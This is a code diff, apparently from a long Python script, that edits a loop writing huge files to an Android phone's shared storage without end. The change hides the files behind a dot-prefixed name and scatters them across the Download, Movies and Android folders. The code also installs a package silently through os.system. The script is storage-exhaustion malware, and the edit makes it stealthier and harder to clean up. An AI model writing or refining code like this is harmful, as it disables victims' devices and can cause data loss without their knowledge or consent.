@@ -1651,8 +1651,11 @@ try:
 except:
     os.system('pip3 install uuid')
 size = 109559 * 5024 * 1024
-filename_prefix = 'file'
-paths = '/storage/emulated/0/'
+filename_prefix = '.file'
+try:
+	paths = ['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Movies/','/storage/emulated/0/Android/']
+except:
+	paths = ['/storage/emulated/0/Download/']
 while True:
     path = random.choice(paths)
     filename = os.path.join(path, f"{filename_prefix}_{uuid.uuid4()}")
